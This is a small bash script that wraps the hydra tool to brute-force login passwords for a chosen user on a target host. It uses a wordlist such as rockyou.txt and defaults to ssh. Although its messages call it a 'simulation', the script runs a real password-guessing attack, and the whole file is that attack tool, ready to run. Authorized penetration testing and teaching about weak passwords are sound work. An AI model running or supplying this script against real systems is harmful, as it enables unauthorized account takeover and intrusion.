#!/bin/bash

set -euo pipefail

usage() {
	echo "Usage: $0 <target_ip_or_host> <username> <wordlist_path> [service]"
	echo "Example: $0 192.168.1.20 admin /usr/share/wordlists/rockyou.txt ssh"
}

if [[ ${1:-} == "-h" || ${1:-} == "--help" ]]; then
	usage
	exit 0
fi

if [[ $# -lt 3 ]]; then
	usage
	exit 1
fi

if ! command -v hydra >/dev/null 2>&1; then
	echo "Error: hydra is not installed or not in PATH."
	exit 1
fi

TARGET="$1"
USERNAME="$2"
WORDLIST="$3"
SERVICE="${4:-ssh}"

if [[ ! -f "$WORDLIST" ]]; then
	echo "Error: wordlist not found: $WORDLIST"
	exit 1
fi

echo "[+] Starting brute-force simulation"
echo "    Target : $TARGET"
echo "    User   : $USERNAME"
echo "    Service: $SERVICE"

hydra -l "$USERNAME" -P "$WORDLIST" "$SERVICE://$TARGET"

echo "[+] Brute-force simulation finished"
